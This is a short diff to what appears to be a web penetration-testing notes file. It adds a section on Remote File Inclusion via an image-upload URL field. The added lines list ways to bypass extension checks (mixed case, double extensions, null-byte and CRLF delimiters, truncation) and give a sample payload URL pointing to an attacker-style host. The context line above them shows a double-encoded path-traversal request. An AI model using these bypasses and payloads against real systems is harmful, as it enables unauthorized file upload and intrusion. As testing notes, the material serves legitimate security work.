@@ -2072,10 +2072,18 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
 
 ### Remote File Inclusion  
 
->RFI function on target allow the upload of image from remote HTTPS URL source.  
+>RFI function on target allow the upload of image from remote HTTPS URL source and perform to validation checks, the source URL must be ```HTTPS``` and the file **extension** is check, but the MIME content type or file content is not validated.  
+
+>Methods to bypass extension validation:  
+
+1. Extension with varied capitalization, such as .```sVG```  
+2. Double extension, such as ```.jpg.svg``` or ```.svg.jpg```  
+3. Extension with a delimiter, such as ```%0a, %09, %0d, %00, #```. Other examples, ```file.png%00.svg``` or ```file.png\x0d\x0a.svg```  
+4. Empty filename, ```.svg```  
+5. Try to cut allowed extension with more than the maximum filename length.  
 
 ```
-fileurl=https://EXPLOIT.net/images.svg.png
+fileurl=https://EXPLOIT.net/images.sVg
 ```  
   
 ![RFI function](images/RFI-function.png)  
